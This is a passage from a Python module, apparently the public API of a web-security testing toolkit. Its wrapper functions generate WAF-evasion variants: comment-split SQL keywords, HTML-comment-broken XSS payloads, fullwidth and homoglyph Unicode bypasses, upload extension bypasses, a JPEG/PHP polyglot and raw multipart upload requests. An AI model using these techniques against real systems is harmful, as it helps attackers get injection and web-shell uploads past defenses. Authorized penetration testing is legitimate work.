    return _hdr_casing.variants(header_name)


def mutate_headers(headers: Dict[str, str]) -> List[Dict[str, str]]:
    """Return header dicts with one key replaced per dict with a casing variant."""
    return _hdr_casing.mutate_headers(headers)


def split_sql_keyword(keyword: str) -> List[str]:
    """Return SQL-comment-split variants of *keyword* at every position."""
    return _comment.split_keyword_sql(keyword)


def whitespace_sql_variants(sql: str) -> List[str]:
    """Replace spaces in *sql* with comment-based whitespace substitutes."""
    return _comment.whitespace_variants_sql(sql)


def html_comment_xss(payload: str) -> List[str]:
    """Insert HTML comments inside XSS tag keywords to evade WAF patterns."""
    return _comment.html_comment_xss(payload)


def fullwidth_encode(text: str) -> str:
    """Convert ASCII printable characters to Unicode fullwidth equivalents."""
    return _unicode.fullwidth(text)


def homoglyph_substitute(text: str, max_subs: int = 3) -> str:
    """Substitute up to *max_subs* characters with visually-similar Unicode homoglyphs."""
    return _unicode.homoglyph_substitute(text, max_subs=max_subs)


def normalization_bypass_variants(keyword: str) -> List[str]:
    """Return fullwidth / homoglyph / zero-width-insert bypass variants of *keyword*."""
    return _unicode.normalization_bypass(keyword)


def mime_extension_variants(ext: str) -> List[str]:
    """Return upload bypass extension variants for a given file extension."""
    return _mime.extension_variants(ext)


def polyglot_php_jpeg() -> bytes:
    """Return a JPEG-magic + PHP polyglot file payload."""
    return _mime.polyglot_php_jpeg()


def build_upload_request(
    filename: str,
    content: bytes,
    content_type: str,
    field_name: str = "file",
    boundary: str = "WebSecureBoundary",
) -> Tuple[bytes, str]:
    """Build a raw multipart/form-data body; returns (body_bytes, content_type_header)."""
    return _mime.build_upload_request(filename, content, content_type, field_name, boundary)
